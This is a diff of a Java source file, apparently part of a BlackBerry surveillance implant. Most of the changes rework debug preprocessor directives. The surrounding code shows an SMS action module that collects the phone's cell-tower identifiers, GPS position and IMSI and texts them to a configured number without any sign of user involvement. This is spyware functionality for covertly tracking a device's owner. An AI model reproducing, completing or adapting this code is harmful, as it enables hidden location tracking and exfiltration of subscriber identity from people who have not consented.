@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -65,7 +66,6 @@ public final class SmsAction extends SubAction {
 
         case TYPE_LOCATION:
             // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-
             getGPSPosition();
 
             break;
@@ -75,8 +75,9 @@ public final class SmsAction extends SubAction {
 
     private void getCellPosition() {
 
-        //#debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("getCellPosition");
+        //#endif
         String message;
 
         boolean gprs = true;
@@ -91,8 +92,8 @@ public final class SmsAction extends SubAction {
             int mnc = cellinfo.getMNC();
             int lac = cellinfo.getLAC();
             int cid = cellinfo.getCellId();
-            
-            int bsic = GPRSInfo.getCellInfo().getBSIC(); 
+
+            int bsic = GPRSInfo.getCellInfo().getBSIC();
 
             StringBuffer mb = new StringBuffer();
             mb.append("MCC: " + Integer.toHexString(mcc));
@@ -113,8 +114,9 @@ public final class SmsAction extends SubAction {
             mb.append(" BID: " + bid);
             message = mb.toString();
         }
-        //#debug info
+        //#ifdef DEBUG_INFO
         debug.info(message);
+        //#endif
 
         sendSMS(message);
     }
@@ -126,8 +128,9 @@ public final class SmsAction extends SubAction {
 
     boolean sendSMS(final String message) {
 
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("Sending sms to: " + number + " message:" + message);
+        //#endif
         try {
             final MessageConnection conn = (MessageConnection) Connector
                     .open("sms://");
@@ -141,12 +144,14 @@ public final class SmsAction extends SubAction {
 
             conn.send(tmsg);
         } catch (final InterruptedIOException e) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("Cannot sending sms to: " + number + " ex:" + e);
+            //#endif
             return false;
         } catch (final IOException e) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("Cannot sending sms to: " + number + " ex:" + e);
+            //#endif
             return false;
         }
         return true;
@@ -186,8 +191,9 @@ public final class SmsAction extends SubAction {
                 text = "IMSI: " + imsi;
                 break;
             default:
-                //#debug error
+                //#ifdef DEBUG_ERROR
                 debug.error("SmsAction.parse,  Unknown type: " + type);
+                //#endif
                 break;
             }
 
@@ -196,14 +202,13 @@ public final class SmsAction extends SubAction {
             return false;
         }
 
-        //#mdebug
+        //#ifdef DEBUG
         StringBuffer sb = new StringBuffer();
         sb.append("type: " + type);
         sb.append("number: " + number);
         sb.append("text: " + text);
-        //#debug info
         debug.info(sb.toString());
-        //#enddebug
+        //#endif
 
         return true;
     }
